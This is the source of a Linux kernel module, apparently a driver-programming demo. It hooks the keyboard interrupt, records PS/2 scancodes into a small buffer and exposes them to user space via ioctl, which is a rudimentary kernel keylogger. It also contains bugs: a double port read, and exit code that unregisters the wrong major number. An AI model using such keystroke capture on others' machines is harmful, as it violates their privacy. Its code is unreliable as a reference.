#include<linux/init.h>
#include<linux/module.h>
#include<linux/fs.h>
#include<linux/uaccess.h>
#include<linux/ioctl.h>
#include<linux/interrupt.h>
#include<asm/io.h>

#define KEYBOARD_IRQ 1        //IRQ NUMBER KEYBOARD

//Port 0x60 is the standard data register for PS/2 keyboard input.
#define KBD_DATA_PORT 0x60    //PORT TO READ KEYBOARD SCANNED

#define MAGIC_NUM 'K'
#define DEVICE_NAME "log"

#define KEY_DISABLE _IOW(MAGIC_NUM,1,int)
#define KEY_ENABLE _IOW(MAGIC_NUM,2,int)
#define KEY_LOG _IOR(MAGIC_NUM,3,char *)

#define BUFF_SIZE  10
static int flag=0;
static int device_number=0;
static int buf_index=0;
static char buff[BUFF_SIZE];

static int my_open(struct inode *inode,struct file *file)
{
        pr_info("key_logging:device opeend\n");
        return 0;
}
static int my_release(struct inode *inode,struct file *file)
{
        pr_info("key_logging:device closed\n");
        return 0;
}
//interrupt handler
irqreturn_t keyboard_irq_handler(int irq,void *dev_id)
{
	uint8_t code = inb(KBD_DATA_PORT);
	//Key Press	0x00 – 0x7F
        //Key Release	0x80 – 0xFF
	if (flag == 0 && code < 0x80 && buf_index < BUFF_SIZE) 
              buff[buf_index++] = inb(KBD_DATA_PORT);
	return IRQ_HANDLED;
}
static long my_ioctl(struct file *file,unsigned int cmd,unsigned long arg)
{
        int user_val;
        switch(cmd)
        {
                case KEY_ENABLE:
                        if(copy_from_user(&user_val,(int __user*)arg,sizeof(user_val)))
                                return -EFAULT;
		 buf_index=0;//seting index value as 0
		 flag=0;//checking if logging disabled
                 pr_info("logging_demo:ENABLING THE KEY LOGGING.......\n");
                 break;
                 case KEY_DISABLE:
                        if(copy_to_user((int __user*)arg,&device_number,sizeof(device_number)))
                                return -EFAULT;
                        flag=1;//disabling the logging
                        pr_info("logging_demo:DISABLING THE KEY LOGGING\n");
                 break;
		 case KEY_LOG:
		       if(copy_to_user((char __user*)arg,buff,buf_index))
                                return -EFAULT;
			printk(KERN_INFO "logging_demo:SENT BUFFER TO USER VIA IOCTL\n");
			return 10;
			break;

                 default:
                 return -EINVAL;
        }
        return 0;
}
static struct file_operations fops={
        .owner=THIS_MODULE,
        .open=my_open,
        .release=my_release,
        .unlocked_ioctl=my_ioctl,
};
static int __init log_init(void)
{
         int result,ret;
        printk(KERN_INFO "LOADING CUSTOM KEYBOARD_IRQ HANDLER---\n");

        // request irq keyboard interrupt
        result=request_irq(KEYBOARD_IRQ,keyboard_irq_handler,IRQF_SHARED,"keyboard_irq_handler",(void*)(keyboard_irq_handler));
         // IRQ number (1 = keyboard)
        // handler function
         // shared (keyboard already used)
         // name shown in /proc/interrupts
          // device ID for shared IRQ
        if(result)
        {
                printk(KERN_ERR "keyboard_irq:cannot registr irq %d\n",KEYBOARD_IRQ);
                return result;
        }
        printk(KERN_INFO "KEYBOARD_IRQ:IRQ HANDLER REGISTERES SUCCESSFULLY\n");

	ret=register_chrdev(0,DEVICE_NAME,&fops);

        if(ret<0)
        {
                pr_err("failed to register the char device:\n");
                return ret;
        }
        pr_info("key_logging:module loaded,major num %d\n",ret);
        return 0;
}
static void __exit log_exit(void)
{
         free_irq(KEYBOARD_IRQ,(void*)(keyboard_irq_handler));
	  unregister_chrdev(device_number, DEVICE_NAME);
        printk(KERN_INFO "KEYBOARD_IRQ:IRQ HANDLER REMOVED\n");
}
MODULE_LICENSE("GPL");
module_init(log_init);
module_exit(log_exit);
MODULE_AUTHOR("sowmya");




